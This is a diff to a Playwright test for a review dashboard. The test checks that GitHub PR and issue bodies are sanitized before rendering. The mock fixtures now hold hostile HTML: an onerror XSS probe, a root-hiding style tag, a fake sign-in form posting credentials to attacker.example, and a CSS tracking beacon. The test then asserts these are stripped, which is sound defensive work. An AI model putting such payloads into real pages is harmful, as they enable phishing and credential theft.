@@ -91,7 +91,13 @@ test('Reviews syncs provider queues and submits GitHub PR reviews', async ({ pag
     body: JSON.stringify([
       {
         number: 42, title: 'Improve agent review flow across multiple projects and the local control plane', state: 'open', html_url: 'https://github.com/acme/platform/pull/42',
-        body: '<details><summary>Release notes</summary><p>Version <strong>0.12.1</strong> <a href="https://example.com/releases">release notes</a><img src="https://example.com/pixel" onerror="alert(1)"></p></details>', draft: false, updated_at: new Date().toISOString(),
+        body: '<details><summary>Release notes</summary><p>Version <strong>0.12.1</strong> ' +
+          '<a href="https://example.com/releases" target="_blank">release notes</a>' +
+          '<img src="https://example.com/pixel" onerror="alert(1)"></p>' +
+          '<style>#root{display:none!important}</style><form action="https://attacker.example">' +
+          '<input name="credential"><button>Sign in</button></form>' +
+          '<p style="background:url(https://attacker.example/pixel)">safe text</p></details>',
+        draft: false, updated_at: new Date().toISOString(),
         user: { login: 'maya' }, head: { ref: `zenchron/agent-run/${runID}`, sha: headSHA }, base: { ref: 'main' },
       },
       {
@@ -105,7 +111,11 @@ test('Reviews syncs provider queues and submits GitHub PR reviews', async ({ pag
     status: 200, contentType: 'application/json',
     body: JSON.stringify([{
       number: 51, title: 'Add setup instructions', state: issueState, html_url: 'https://github.com/acme/platform/issues/51',
-      body: 'Document local worker setup.', updated_at: new Date().toISOString(), user: { login: 'alex' }, labels: [{ name: 'docs' }],
+      body: '<style>#root{display:none!important}</style><form action="https://attacker.example">' +
+        '<input name="credential"><button>Sign in</button></form>' +
+        '<p style="background:url(https://attacker.example/pixel)">Document local worker setup.</p>' +
+        '<a href="https://example.com/setup" target="_blank">setup reference</a>',
+      updated_at: new Date().toISOString(), user: { login: 'alex' }, labels: [{ name: 'docs' }],
     }]),
   }));
   await page.route(`**/api/v1/projects/${projectID}/issues/*/comments`, async (route) => {
@@ -201,8 +211,11 @@ test('Reviews syncs provider queues and submits GitHub PR reviews', async ({ pag
   await expect(page.locator('.reviews-summary-copy details summary')).toHaveText('Release notes');
   await expect(page.locator('.reviews-summary-copy')).not.toContainText('<details>');
   await expect(page.locator('.reviews-summary-copy a')).toHaveAttribute('href', 'https://example.com/releases');
+  await expect(page.locator('.reviews-summary-copy a')).toHaveAttribute('rel', 'noopener noreferrer');
   await expect(page.locator('.reviews-summary-copy [onerror]')).toHaveCount(0);
   await expect(page.locator('.reviews-summary-copy img')).toHaveCount(0);
+  await expect(page.locator('.reviews-summary-copy style, .reviews-summary-copy form, .reviews-summary-copy input, ' +
+    '.reviews-summary-copy button, .reviews-summary-copy [style]')).toHaveCount(0);
   const pullRequestCard = page.locator('.reviews-provider-card').first();
   await expect(pullRequestCard.locator('.reviews-provider-number')).toHaveText('#42');
   await expect(pullRequestCard.locator('strong')).toContainText('Improve agent review flow across multiple projects');
@@ -298,6 +311,9 @@ test('Reviews syncs provider queues and submits GitHub PR reviews', async ({ pag
   await expect(page.getByRole('link', { name: 'Open issue on GitHub' })).toHaveAttribute('href', 'https://github.com/acme/platform/issues/51');
   await expect(page.getByRole('heading', { name: 'Issues (1)' })).toBeVisible();
   await expect(page.locator('.reviews-provider-detail .reviews-pr-description')).toBeVisible();
+  await expect(page.locator('.reviews-pr-description style, .reviews-pr-description form, .reviews-pr-description input, ' +
+    '.reviews-pr-description button, .reviews-pr-description [style]')).toHaveCount(0);
+  await expect(page.locator('.reviews-pr-description a')).toHaveAttribute('rel', 'noopener noreferrer');
   await expect(page.locator('.reviews-detail-heading .reviews-required')).toHaveText('Open');
   await page.locator('.reviews-summary-review-actions').getByRole('button', { name: 'Add comment' }).click();
   await expect(page.getByLabel('GitHub issue comment')).toBeVisible();
